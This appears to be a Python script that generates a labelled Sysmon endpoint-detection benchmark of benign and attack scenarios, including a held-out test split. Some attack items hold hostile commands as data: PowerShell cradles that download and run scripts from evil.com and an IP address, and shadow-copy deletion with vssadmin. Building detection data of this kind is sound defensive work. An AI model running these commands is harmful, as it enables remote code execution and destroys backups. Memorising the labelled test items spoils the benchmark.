"""
research/generate_sysmon_v1.py

Generates the Phase 5 Windows / Sysmon Endpoint Benchmark Dataset (Sysmon V1):
- Total: 50 scenarios (25 ATTACK / SUSPICIOUS, 25 BENIGN)
- Partitions:
  - Development: 26 scenarios (13 ATTACK, 13 BENIGN)
  - Validation:  10 scenarios (5 ATTACK, 5 BENIGN)
  - Test:        14 scenarios (7 ATTACK, 7 BENIGN) — STRICTLY HELD OUT!
- Coverage:
  BENIGN:
  - Legitimate PowerShell administration (Get-Service, Get-Process, Get-EventLog, Unrestricted script execution)
  - Developer tooling & build pipelines (git.exe, python.exe, node.exe, rustc compiling binaries)
  - Standard user desktop activity (explorer.exe spawning notepad.exe, calc.exe, chrome.exe)
  - Browser network connections to HTTPS/HTTP (msedge.exe to port 443 / 80)
  - Corporate DNS resolution (microsoft.com, google.com, corp.internal, github.com)
  - Authorized software installation (msiexec.exe creating binaries in Program Files)
  - System service processes (services.exe spawning svchost.exe)
  ATTACK / SUSPICIOUS:
  - ENDPOINT-001: Obfuscated PowerShell (-enc, -encodedcommand), hidden window execution, vssadmin shadow deletion, whoami /priv reconnaissance
  - ENDPOINT-002: Web server (w3wp.exe, nginx.exe) spawning cmd.exe/powershell.exe; Office (winword.exe, excel.exe) spawning script engines
  - ENDPOINT-003: Living-off-the-land utilities (certutil.exe, rundll32.exe, powershell.exe) connecting to non-standard ports (8080, 4444, 1337)
  - ENDPOINT-004: Suspicious DNS queries to dynamic DNS (duckdns.org, ngrok.io) and staging domains
  - ENDPOINT-005: Script hosts or web servers creating executable payloads in %TEMP% or AppData directories
"""

from __future__ import annotations

import hashlib
import json
from datetime import UTC, datetime, timedelta
from pathlib import Path


def generate_sysmon_dataset():
    base_time = datetime(2026, 10, 8, 10, 0, 0, tzinfo=UTC)
    scenarios = []

    def make_event(
        ts,
        event_id_num,
        computer="CORP-WKSTN-01",
        user="CORP\\jsmith",
        image=None,
        parent_image=None,
        pid=1000,
        ppid=500,
        cmdline=None,
        hashes=None,
        src_ip=None,
        dst_ip=None,
        src_port=None,
        dst_port=None,
        proto=None,
        dns_query=None,
        dns_response=None,
        target_filename=None,
        image_loaded=None,
    ):
        proc_name = image.split("\\")[-1] if image else None
        parent_proc_name = parent_image.split("\\")[-1] if parent_image else None
        raw_ref = target_filename or dns_query or f"GUID-E{event_id_num}-{pid}"

        if event_id_num == 1:
            ev_type = "sysmon_process_create"
            msg = f"Process Create: {proc_name} (PID: {pid}) by {parent_proc_name} (PPID: {ppid})"
        elif event_id_num == 3:
            ev_type = "sysmon_network_connection"
            msg = f"Network Connection: {proc_name} (PID: {pid}) {src_ip}:{src_port} -> {dst_ip}:{dst_port} ({proto})"
        elif event_id_num == 5:
            ev_type = "sysmon_process_terminate"
            msg = f"Process Terminated: {proc_name} (PID: {pid})"
        elif event_id_num == 7:
            ev_type = "sysmon_image_load"
            msg = f"Image Loaded: {image_loaded} by {proc_name} (PID: {pid})"
        elif event_id_num == 11:
            ev_type = "sysmon_file_create"
            msg = f"File Create: {target_filename} by {proc_name} (PID: {pid})"
        elif event_id_num == 22:
            ev_type = "sysmon_dns_query"
            msg = f"DNS Query: {dns_query} by {proc_name} (PID: {pid})"
        else:
            ev_type = f"sysmon_event_{event_id_num}"
            msg = f"Sysmon Event {event_id_num}"

        return {
            "timestamp": ts.isoformat(),
            "source_type": "SYSMON",
            "source_name": "Microsoft-Windows-Sysmon",
            "event_id": f"SYSMON-{computer}-E{event_id_num}-{pid}-{int(ts.timestamp())}",
            "hostname": computer,
            "username": user,
            "process": proc_name,
            "parent_process": parent_proc_name,
            "process_id": pid,
            "parent_process_id": ppid,
            "command_line": cmdline,
            "image_path": image,
            "file_hash": hashes,
            "source_ip": src_ip,
            "destination_ip": dst_ip,
            "source_port": src_port,
            "destination_port": dst_port,
            "protocol": proto.lower() if proto else None,
            "dns_query": dns_query,
            "dns_response": dns_response,
            "event_type": ev_type,
            "event_category": "endpoint",
            "severity": "low",
            "message": msg,
            "raw_reference": raw_ref,
            "raw_log": json.dumps({"EventID": event_id_num, "Image": image, "CommandLine": cmdline, "Computer": computer}),
        }

    # -------------------------------------------------------------
    # SCENARIOS DEFINITION
    # -------------------------------------------------------------

    # DEV SET: 26 Scenarios (13 ATTACK, 13 BENIGN)
    dev_defs = [
        # Benign 1-13
        {
            "id": "SCEN-SYSMON-DEV-001",
            "ground_truth": "BENIGN",
            "category": "normal_process",
            "desc": "Explorer launches Notepad for editing a document",
            "events": [
                make_event(base_time + timedelta(seconds=1), 1, image="C:\\Windows\\System32\\notepad.exe", parent_image="C:\\Windows\\explorer.exe", pid=2100, ppid=1024, cmdline="notepad.exe C:\\Users\\jsmith\\notes.txt")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-002",
            "ground_truth": "BENIGN",
            "category": "legitimate_powershell",
            "desc": "Administrator checks Windows services via PowerShell without obfuscation",
            "events": [
                make_event(base_time + timedelta(seconds=10), 1, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_image="C:\\Windows\\explorer.exe", pid=2110, ppid=1024, cmdline="powershell.exe Get-Service -Name wuauserv")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-003",
            "ground_truth": "BENIGN",
            "category": "normal_network",
            "desc": "Edge browser initiates HTTPS connection to corporate portal",
            "events": [
                make_event(base_time + timedelta(seconds=20), 3, image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", pid=3100, src_ip="10.0.0.15", dst_ip="198.51.100.10", src_port=51020, dst_port=443, proto="tcp")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-004",
            "ground_truth": "BENIGN",
            "category": "normal_dns",
            "desc": "Edge browser queries DNS for microsoft.com",
            "events": [
                make_event(base_time + timedelta(seconds=30), 22, image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", pid=3100, dns_query="login.microsoft.com", dns_response="20.190.159.0")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-005",
            "ground_truth": "BENIGN",
            "category": "normal_file_create",
            "desc": "Software installer creates DLL in Program Files",
            "events": [
                make_event(base_time + timedelta(seconds=40), 11, image="C:\\Windows\\System32\\msiexec.exe", pid=1400, target_filename="C:\\Program Files\\CorporateApp\\library.dll")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-006",
            "ground_truth": "BENIGN",
            "category": "normal_process_tree",
            "desc": "Services.exe launches svchost.exe for Windows Update",
            "events": [
                make_event(base_time + timedelta(seconds=50), 1, image="C:\\Windows\\System32\\svchost.exe", parent_image="C:\\Windows\\System32\\services.exe", pid=880, ppid=600, cmdline="svchost.exe -k netsvcs -p -s wuauserv")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-007",
            "ground_truth": "BENIGN",
            "category": "developer_powershell",
            "desc": "Developer runs local PowerShell build script without hidden window or encoded command",
            "events": [
                make_event(base_time + timedelta(seconds=60), 1, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_image="C:\\Windows\\System32\\cmd.exe", pid=2200, ppid=2150, cmdline="powershell.exe -ExecutionPolicy Bypass -File build.ps1")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-008",
            "ground_truth": "BENIGN",
            "category": "legitimate_certutil",
            "desc": "Certutil verifies local certificate hash without network download",
            "events": [
                make_event(base_time + timedelta(seconds=70), 1, image="C:\\Windows\\System32\\certutil.exe", parent_image="C:\\Windows\\explorer.exe", pid=2300, ppid=1024, cmdline="certutil.exe -hashfile cert.crt SHA256")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-009",
            "ground_truth": "BENIGN",
            "category": "normal_dns",
            "desc": "Developer queries DNS for github.com",
            "events": [
                make_event(base_time + timedelta(seconds=80), 22, image="C:\\Program Files\\Git\\bin\\git.exe", pid=3300, dns_query="github.com", dns_response="140.82.121.4")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-010",
            "ground_truth": "BENIGN",
            "category": "normal_process",
            "desc": "Task manager launched by explorer",
            "events": [
                make_event(base_time + timedelta(seconds=90), 1, image="C:\\Windows\\System32\\taskmgr.exe", parent_image="C:\\Windows\\explorer.exe", pid=2400, ppid=1024, cmdline="taskmgr.exe")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-011",
            "ground_truth": "BENIGN",
            "category": "normal_network",
            "desc": "Outlook connects to Exchange over port 443",
            "events": [
                make_event(base_time + timedelta(seconds=100), 3, image="C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", pid=3500, src_ip="10.0.0.15", dst_ip="198.51.100.5", src_port=52100, dst_port=443, proto="tcp")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-012",
            "ground_truth": "BENIGN",
            "category": "normal_image_load",
            "desc": "Legitimate DLL image loaded by explorer",
            "events": [
                make_event(base_time + timedelta(seconds=110), 7, image="C:\\Windows\\explorer.exe", pid=1024, image_loaded="C:\\Windows\\System32\\shell32.dll")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-013",
            "ground_truth": "BENIGN",
            "category": "normal_dns",
            "desc": "System queries corporate domain controller DNS",
            "events": [
                make_event(base_time + timedelta(seconds=120), 22, image="C:\\Windows\\System32\\svchost.exe", pid=880, dns_query="dc01.corp.internal", dns_response="10.0.0.1")
            ],
        },
        # Attack 1-13
        {
            "id": "SCEN-SYSMON-DEV-014",
            "ground_truth": "ATTACK",
            "category": "suspicious_process_execution",
            "desc": "PowerShell launched with base64 encoded command payload",
            "expected_rule": "ENDPOINT-001",
            "events": [
                make_event(base_time + timedelta(seconds=130), 1, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_image="C:\\Windows\\System32\\cmd.exe", pid=4100, ppid=4050, cmdline="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQALgAuAC4A")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-015",
            "ground_truth": "ATTACK",
            "category": "suspicious_process_execution",
            "desc": "PowerShell executed with hidden window style and download cradle",
            "expected_rule": "ENDPOINT-001",
            "events": [
                make_event(base_time + timedelta(seconds=140), 1, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_image="C:\\Windows\\explorer.exe", pid=4110, ppid=1024, cmdline="powershell.exe -w hidden -nop -c \"IEX(New-Object Net.WebClient).downloadstring('http://evil.com/p.ps1')\"")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-016",
            "ground_truth": "ATTACK",
            "category": "suspicious_parent_child",
            "desc": "IIS web server process w3wp.exe spawns interactive cmd.exe shell",
            "expected_rule": "ENDPOINT-002",
            "events": [
                make_event(base_time + timedelta(seconds=150), 1, image="C:\\Windows\\System32\\cmd.exe", parent_image="C:\\Windows\\System32\\inetsrv\\w3wp.exe", pid=4200, ppid=2000, cmdline="cmd.exe /c whoami")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-017",
            "ground_truth": "ATTACK",
            "category": "suspicious_parent_child",
            "desc": "Microsoft Word spawns PowerShell interpreter",
            "expected_rule": "ENDPOINT-002",
            "events": [
                make_event(base_time + timedelta(seconds=160), 1, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", pid=4210, ppid=3400, cmdline="powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Calc.exe")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-018",
            "ground_truth": "ATTACK",
            "category": "suspicious_network_connection",
            "desc": "Certutil.exe establishes outbound connection to external port 8080",
            "expected_rule": "ENDPOINT-003",
            "events": [
                make_event(base_time + timedelta(seconds=170), 3, image="C:\\Windows\\System32\\certutil.exe", pid=4300, src_ip="10.0.0.15", dst_ip="198.51.100.80", src_port=49500, dst_port=8080, proto="tcp")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-019",
            "ground_truth": "ATTACK",
            "category": "suspicious_network_connection",
            "desc": "PowerShell connects to remote command-and-control port 4444",
            "expected_rule": "ENDPOINT-003",
            "events": [
                make_event(base_time + timedelta(seconds=180), 3, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pid=4310, src_ip="10.0.0.15", dst_ip="203.0.113.50", src_port=49510, dst_port=4444, proto="tcp")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-020",
            "ground_truth": "ATTACK",
            "category": "suspicious_dns",
            "desc": "PowerShell queries dynamic DNS domain for beaconing",
            "expected_rule": "ENDPOINT-004",
            "events": [
                make_event(base_time + timedelta(seconds=190), 22, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pid=4400, dns_query="beacon-c2.duckdns.org", dns_response="198.51.100.99")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-021",
            "ground_truth": "ATTACK",
            "category": "suspicious_dns",
            "desc": "Script host queries C2 staging tunnel domain",
            "expected_rule": "ENDPOINT-004",
            "events": [
                make_event(base_time + timedelta(seconds=200), 22, image="C:\\Windows\\System32\\wscript.exe", pid=4410, dns_query="c2-stage.internal-tunnel.me", dns_response="198.51.100.101")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-022",
            "ground_truth": "ATTACK",
            "category": "suspicious_file_creation",
            "desc": "PowerShell writes binary executable to local user Temp directory",
            "expected_rule": "ENDPOINT-005",
            "events": [
                make_event(base_time + timedelta(seconds=210), 11, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pid=4500, target_filename="C:\\Users\\jsmith\\AppData\\Local\\Temp\\dropper.exe")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-023",
            "ground_truth": "ATTACK",
            "category": "suspicious_file_creation",
            "desc": "IIS web server creates executable file in temp directory",
            "expected_rule": "ENDPOINT-005",
            "events": [
                make_event(base_time + timedelta(seconds=220), 11, image="C:\\Windows\\System32\\inetsrv\\w3wp.exe", pid=2000, target_filename="C:\\Windows\\Temp\\webshell_agent.exe")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-024",
            "ground_truth": "ATTACK",
            "category": "suspicious_process_execution",
            "desc": "Ransomware pre-execution: vssadmin deletes volume shadow copies",
            "expected_rule": "ENDPOINT-001",
            "events": [
                make_event(base_time + timedelta(seconds=230), 1, image="C:\\Windows\\System32\\vssadmin.exe", parent_image="C:\\Windows\\System32\\cmd.exe", pid=4600, ppid=4590, cmdline="vssadmin delete shadows /all /quiet")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-025",
            "ground_truth": "ATTACK",
            "category": "suspicious_process_execution",
            "desc": "Reconnaissance: whoami /priv executed to enumerate user privileges",
            "expected_rule": "ENDPOINT-001",
            "events": [
                make_event(base_time + timedelta(seconds=240), 1, image="C:\\Windows\\System32\\whoami.exe", parent_image="C:\\Windows\\System32\\cmd.exe", pid=4610, ppid=4590, cmdline="whoami /priv")
            ],
        },
        {
            "id": "SCEN-SYSMON-DEV-026",
            "ground_truth": "ATTACK",
            "category": "suspicious_parent_child",
            "desc": "Nginx web server spawns interactive PowerShell shell",
            "expected_rule": "ENDPOINT-002",
            "events": [
                make_event(base_time + timedelta(seconds=250), 1, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_image="C:\\nginx\\nginx.exe", pid=4700, ppid=2500, cmdline="powershell.exe -NoExit")
            ],
        },
    ]

    for s in dev_defs:
        s["split"] = "development"
        s["events_count"] = len(s["events"])
        scenarios.append(s)

    # VALIDATION SET: 10 Scenarios (5 ATTACK, 5 BENIGN)
    val_defs = [
        # Benign 1-5
        {
            "id": "SCEN-SYSMON-VAL-001",
            "ground_truth": "BENIGN",
            "category": "legitimate_powershell",
            "desc": "PowerShell Get-Process command run by IT admin",
            "events": [
                make_event(base_time + timedelta(seconds=300), 1, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_image="C:\\Windows\\explorer.exe", pid=5100, ppid=1024, cmdline="powershell.exe Get-Process | Sort-Object CPU -Descending")
            ],
        },
        {
            "id": "SCEN-SYSMON-VAL-002",
            "ground_truth": "BENIGN",
            "category": "normal_dns",
            "desc": "Browser resolves azure.microsoft.com",
            "events": [
                make_event(base_time + timedelta(seconds=310), 22, image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", pid=3100, dns_query="portal.azure.com", dns_response="40.89.244.237")
            ],
        },
        {
            "id": "SCEN-SYSMON-VAL-003",
            "ground_truth": "BENIGN",
            "category": "normal_network",
            "desc": "Chrome connects to web server port 80",
            "events": [
                make_event(base_time + timedelta(seconds=320), 3, image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", pid=5200, src_ip="10.0.0.15", dst_ip="198.51.100.22", src_port=53001, dst_port=80, proto="tcp")
            ],
        },
        {
            "id": "SCEN-SYSMON-VAL-004",
            "ground_truth": "BENIGN",
            "category": "normal_file_create",
            "desc": "Word autosaves document in user AppData folder",
            "events": [
                make_event(base_time + timedelta(seconds=330), 11, image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", pid=3400, target_filename="C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\Office\\UnsavedFiles\\report.asd")
            ],
        },
        {
            "id": "SCEN-SYSMON-VAL-005",
            "ground_truth": "BENIGN",
            "category": "normal_process_tree",
            "desc": "Explorer launches cmd.exe interactively",
            "events": [
                make_event(base_time + timedelta(seconds=340), 1, image="C:\\Windows\\System32\\cmd.exe", parent_image="C:\\Windows\\explorer.exe", pid=5300, ppid=1024, cmdline="cmd.exe /k cd C:\\Users\\jsmith")
            ],
        },
        # Attack 1-5
        {
            "id": "SCEN-SYSMON-VAL-006",
            "ground_truth": "ATTACK",
            "category": "suspicious_process_execution",
            "desc": "PowerShell with -EncodedCommand parameter",
            "expected_rule": "ENDPOINT-001",
            "events": [
                make_event(base_time + timedelta(seconds=350), 1, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_image="C:\\Windows\\System32\\cmd.exe", pid=6100, ppid=5300, cmdline="powershell.exe -encodedcommand ZQBjAGgAbwAgACIASABhAGMAawBlAGQAIgA=")
            ],
        },
        {
            "id": "SCEN-SYSMON-VAL-007",
            "ground_truth": "ATTACK",
            "category": "suspicious_parent_child",
            "desc": "Excel macro spawns command prompt cmd.exe",
            "expected_rule": "ENDPOINT-002",
            "events": [
                make_event(base_time + timedelta(seconds=360), 1, image="C:\\Windows\\System32\\cmd.exe", parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", pid=6200, ppid=3600, cmdline="cmd.exe /c start payload.exe")
            ],
        },
        {
            "id": "SCEN-SYSMON-VAL-008",
            "ground_truth": "ATTACK",
            "category": "suspicious_network_connection",
            "desc": "Rundll32 makes outbound connection to port 1337",
            "expected_rule": "ENDPOINT-003",
            "events": [
                make_event(base_time + timedelta(seconds=370), 3, image="C:\\Windows\\System32\\rundll32.exe", pid=6300, src_ip="10.0.0.15", dst_ip="198.51.100.88", src_port=54000, dst_port=1337, proto="tcp")
            ],
        },
        {
            "id": "SCEN-SYSMON-VAL-009",
            "ground_truth": "ATTACK",
            "category": "suspicious_dns",
            "desc": "PowerShell queries ngrok tunneling domain",
            "expected_rule": "ENDPOINT-004",
            "events": [
                make_event(base_time + timedelta(seconds=380), 22, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pid=6400, dns_query="agent-tunnel.ngrok.io", dns_response="198.51.100.120")
            ],
        },
        {
            "id": "SCEN-SYSMON-VAL-010",
            "ground_truth": "ATTACK",
            "category": "suspicious_file_creation",
            "desc": "Cmd.exe writes executable script to Startup folder",
            "expected_rule": "ENDPOINT-005",
            "events": [
                make_event(base_time + timedelta(seconds=390), 11, image="C:\\Windows\\System32\\cmd.exe", pid=6500, target_filename="C:\\Users\\jsmith\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat")
            ],
        },
    ]

    for s in val_defs:
        s["split"] = "validation"
        s["events_count"] = len(s["events"])
        scenarios.append(s)

    # TEST SET: 14 Scenarios (7 ATTACK, 7 BENIGN) — HELD OUT
    test_defs = [
        # Benign 1-7
        {
            "id": "SCEN-SYSMON-TEST-001",
            "ground_truth": "BENIGN",
            "category": "normal_process",
            "desc": "Developer compiles code using csc.exe",
            "events": [
                make_event(base_time + timedelta(seconds=400), 1, image="C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe", parent_image="C:\\Windows\\System32\\cmd.exe", pid=7100, ppid=5300, cmdline="csc.exe /target:exe Program.cs")
            ],
        },
        {
            "id": "SCEN-SYSMON-TEST-002",
            "ground_truth": "BENIGN",
            "category": "normal_network",
            "desc": "Teams client establishes call media over port 443",
            "events": [
                make_event(base_time + timedelta(seconds=410), 3, image="C:\\Program Files\\WindowsApps\\MSTeams_24000.0\\ms-teams.exe", pid=7200, src_ip="10.0.0.15", dst_ip="198.51.100.15", src_port=55001, dst_port=443, proto="tcp")
            ],
        },
        {
            "id": "SCEN-SYSMON-TEST-003",
            "ground_truth": "BENIGN",
            "category": "normal_dns",
            "desc": "OneDrive sync queries live.com",
            "events": [
                make_event(base_time + timedelta(seconds=420), 22, image="C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe", pid=7300, dns_query="api.onedrive.live.com", dns_response="13.107.136.9")
            ],
        },
        {
            "id": "SCEN-SYSMON-TEST-004",
            "ground_truth": "BENIGN",
            "category": "normal_powershell",
            "desc": "Scheduled task runs maintenance PowerShell script",
            "events": [
                make_event(base_time + timedelta(seconds=430), 1, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_image="C:\\Windows\\System32\\taskeng.exe", pid=7400, ppid=900, cmdline="powershell.exe -NoProfile -File C:\\Scripts\\maintenance.ps1")
            ],
        },
        {
            "id": "SCEN-SYSMON-TEST-005",
            "ground_truth": "BENIGN",
            "category": "normal_process",
            "desc": "Windows Calculator launched by user",
            "events": [
                make_event(base_time + timedelta(seconds=440), 1, image="C:\\Program Files\\WindowsApps\\CalculatorApp\\Calculator.exe", parent_image="C:\\Windows\\explorer.exe", pid=7500, ppid=1024, cmdline="Calculator.exe")
            ],
        },
        {
            "id": "SCEN-SYSMON-TEST-006",
            "ground_truth": "BENIGN",
            "category": "normal_file_create",
            "desc": "Visual Studio writes project debug pdb file",
            "events": [
                make_event(base_time + timedelta(seconds=450), 11, image="C:\\Program Files\\Microsoft Visual Studio\\devenv.exe", pid=7600, target_filename="C:\\Users\\jsmith\\Projects\\App\\bin\\Debug\\App.pdb")
            ],
        },
        {
            "id": "SCEN-SYSMON-TEST-007",
            "ground_truth": "BENIGN",
            "category": "normal_network",
            "desc": "Git pushes changes over HTTPS port 443",
            "events": [
                make_event(base_time + timedelta(seconds=460), 3, image="C:\\Program Files\\Git\\bin\\git.exe", pid=7700, src_ip="10.0.0.15", dst_ip="140.82.121.4", src_port=56000, dst_port=443, proto="tcp")
            ],
        },
        # Attack 1-7
        {
            "id": "SCEN-SYSMON-TEST-008",
            "ground_truth": "ATTACK",
            "category": "suspicious_process_execution",
            "desc": "PowerShell invoked with invoke-expression download payload",
            "expected_rule": "ENDPOINT-001",
            "events": [
                make_event(base_time + timedelta(seconds=470), 1, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_image="C:\\Windows\\System32\\cmd.exe", pid=8100, ppid=5300, cmdline="powershell.exe -w hidden invoke-expression (New-Object Net.WebClient).DownloadString('http://198.51.100.99/rev.ps1')")
            ],
        },
        {
            "id": "SCEN-SYSMON-TEST-009",
            "ground_truth": "ATTACK",
            "category": "suspicious_parent_child",
            "desc": "Apache web server spawns cmd.exe shell",
            "expected_rule": "ENDPOINT-002",
            "events": [
                make_event(base_time + timedelta(seconds=480), 1, image="C:\\Windows\\System32\\cmd.exe", parent_image="C:\\Apache24\\bin\\httpd.exe", pid=8200, ppid=2200, cmdline="cmd.exe /c dir C:\\")
            ],
        },
        {
            "id": "SCEN-SYSMON-TEST-010",
            "ground_truth": "ATTACK",
            "category": "suspicious_parent_child",
            "desc": "Excel spawns wscript.exe script engine",
            "expected_rule": "ENDPOINT-002",
            "events": [
                make_event(base_time + timedelta(seconds=490), 1, image="C:\\Windows\\System32\\wscript.exe", parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", pid=8300, ppid=3600, cmdline="wscript.exe //B C:\\Users\\Public\\macro.vbs")
            ],
        },
        {
            "id": "SCEN-SYSMON-TEST-011",
            "ground_truth": "ATTACK",
            "category": "suspicious_network_connection",
            "desc": "Regsvr32 initiates outbound network connection to port 8443",
            "expected_rule": "ENDPOINT-003",
            "events": [
                make_event(base_time + timedelta(seconds=500), 3, image="C:\\Windows\\System32\\regsvr32.exe", pid=8400, src_ip="10.0.0.15", dst_ip="198.51.100.60", src_port=57000, dst_port=8443, proto="tcp")
            ],
        },
        {
            "id": "SCEN-SYSMON-TEST-012",
            "ground_truth": "ATTACK",
            "category": "suspicious_dns",
            "desc": "Command shell queries burpcollaborator testing staging domain",
            "expected_rule": "ENDPOINT-004",
            "events": [
                make_event(base_time + timedelta(seconds=510), 22, image="C:\\Windows\\System32\\cmd.exe", pid=8500, dns_query="test1.burpcollaborator.net", dns_response="198.51.100.200")
            ],
        },
        {
            "id": "SCEN-SYSMON-TEST-013",
            "ground_truth": "ATTACK",
            "category": "suspicious_file_creation",
            "desc": "Wscript drops executable in Temp directory",
            "expected_rule": "ENDPOINT-005",
            "events": [
                make_event(base_time + timedelta(seconds=520), 11, image="C:\\Windows\\System32\\wscript.exe", pid=8600, target_filename="C:\\Users\\jsmith\\AppData\\Local\\Temp\\update_service.exe")
            ],
        },
        {
            "id": "SCEN-SYSMON-TEST-014",
            "ground_truth": "ATTACK",
            "category": "suspicious_network_connection",
            "desc": "Cmd.exe initiates outbound connection to port 31337",
            "expected_rule": "ENDPOINT-003",
            "events": [
                make_event(base_time + timedelta(seconds=530), 3, image="C:\\Windows\\System32\\cmd.exe", pid=8700, src_ip="10.0.0.15", dst_ip="198.51.100.90", src_port=58000, dst_port=31337, proto="tcp")
            ],
        },
    ]

    for s in test_defs:
        s["split"] = "test"
        s["events_count"] = len(s["events"])
        scenarios.append(s)

    # -------------------------------------------------------------
    # WRITE DATASET AND MANIFEST
    # -------------------------------------------------------------
    out_dir = Path(__file__).resolve().parent / "datasets" / "sysmon_v1"
    out_dir.mkdir(parents=True, exist_ok=True)

    dev_scenarios = [s for s in scenarios if s["split"] == "development"]
    val_scenarios = [s for s in scenarios if s["split"] == "validation"]
    test_scenarios = [s for s in scenarios if s["split"] == "test"]

    def write_json(path: Path, data: Any) -> str:
        content = json.dumps(data, indent=2)
        path.write_text(content, encoding="utf-8")
        return hashlib.sha256(content.encode("utf-8")).hexdigest()

    full_sha = write_json(out_dir / "sysmon_v1.json", scenarios)
    dev_sha = write_json(out_dir / "dev_set.json", dev_scenarios)
    val_sha = write_json(out_dir / "val_set.json", val_scenarios)
    test_sha = write_json(out_dir / "test_set.json", test_scenarios)

    manifest = {
        "dataset_name": "RESEARCH_SYSMON_DATASET_V1",
        "dataset_version": "v1.0",
        "created_at": datetime.now(UTC).isoformat(),
        "total_scenarios": len(scenarios),
        "attack_count": sum(1 for s in scenarios if s["ground_truth"] == "ATTACK"),
        "benign_count": sum(1 for s in scenarios if s["ground_truth"] == "BENIGN"),
        "total_telemetry_events": sum(s["events_count"] for s in scenarios),
        "split_distribution": {
            "development": {
                "total": len(dev_scenarios),
                "attack": sum(1 for s in dev_scenarios if s["ground_truth"] == "ATTACK"),
                "benign": sum(1 for s in dev_scenarios if s["ground_truth"] == "BENIGN"),
                "sha256": dev_sha,
            },
            "validation": {
                "total": len(val_scenarios),
                "attack": sum(1 for s in val_scenarios if s["ground_truth"] == "ATTACK"),
                "benign": sum(1 for s in val_scenarios if s["ground_truth"] == "BENIGN"),
                "sha256": val_sha,
            },
            "test": {
                "total": len(test_scenarios),
                "attack": sum(1 for s in test_scenarios if s["ground_truth"] == "ATTACK"),
                "benign": sum(1 for s in test_scenarios if s["ground_truth"] == "BENIGN"),
                "sha256": test_sha,
                "status": "HELD_OUT_UNTOUCHED",
            },
        },
        "full_dataset_sha256": full_sha,
    }
    write_json(out_dir / "sysmon_v1_manifest.json", manifest)

    print("=== SYSMON V1 BENCHMARK DATASET GENERATED ===")
    print(f"Total scenarios: {len(scenarios)}")
    print(f"  Dev split: {len(dev_scenarios)} (Attack: {manifest['split_distribution']['development']['attack']}, Benign: {manifest['split_distribution']['development']['benign']})")
    print(f"  Val split: {len(val_scenarios)} (Attack: {manifest['split_distribution']['validation']['attack']}, Benign: {manifest['split_distribution']['validation']['benign']})")
    print(f"  Test split: {len(test_scenarios)} (Attack: {manifest['split_distribution']['test']['attack']}, Benign: {manifest['split_distribution']['test']['benign']}) [UNTOUCHED]")
    print(f"Full Dataset SHA-256: {full_sha}")


if __name__ == "__main__":
    generate_sysmon_dataset()
